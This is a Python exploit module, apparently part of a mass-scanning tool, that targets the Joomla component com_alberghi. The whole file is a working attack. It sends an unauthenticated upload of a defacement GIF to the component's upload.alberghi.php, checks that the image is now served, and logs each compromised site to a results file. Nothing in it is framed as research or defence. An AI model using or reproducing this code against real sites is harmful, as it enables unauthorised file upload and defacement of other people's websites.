# coding=utf-8
import requests
import printModule

Headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
r = '\033[31m'
g = '\033[32m'
y = '\033[33m'
b = '\033[34m'
m = '\033[35m'
c = '\033[36m'
w = '\033[37m'
Jce_Deface_image = 'files/pwn.gif'

def Exploit(site):
    try:
        fileDeface = {'userfile': open(Jce_Deface_image, 'rb')}
        Exp = 'http://' + site + '/administrator/components/com_alberghi/upload.alberghi.php'
        Check = requests.get(Exp, timeout=10, headers=Headers)
        if 'class="inputbox" name="userfile"' in str(Check.content):
            Post = requests.post(Exp, files=fileDeface, timeout=10, headers=Headers)
            if 'has been successfully' or 'already exists' in str(Post.content):
                CheckIndex = requests.get(site + '/administrator/components/com_alberghi/' +
                                          Jce_Deface_image.split('/')[1], timeout=10, headers=Headers)
                if 'GIF89a' in str(CheckIndex.content):
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(site + '/administrator/components/com_alberghi/' +
                                     Jce_Deface_image.split('/')[1] + '\n')
                    return printModule.returnYes(site, 'N/A', 'Com_alberghi', 'Joomla')
                return printModule.returnYes(site, 'N/A', 'Com_alberghi', 'Joomla')
            else:
                return printModule.returnNo(site, 'N/A', 'Com_alberghi', 'Joomla')
        else:
            return printModule.returnNo(site, 'N/A', 'Com_alberghi', 'Joomla')
    except:
        return printModule.returnNo(site, 'N/A', 'Com_alberghi', 'Joomla')
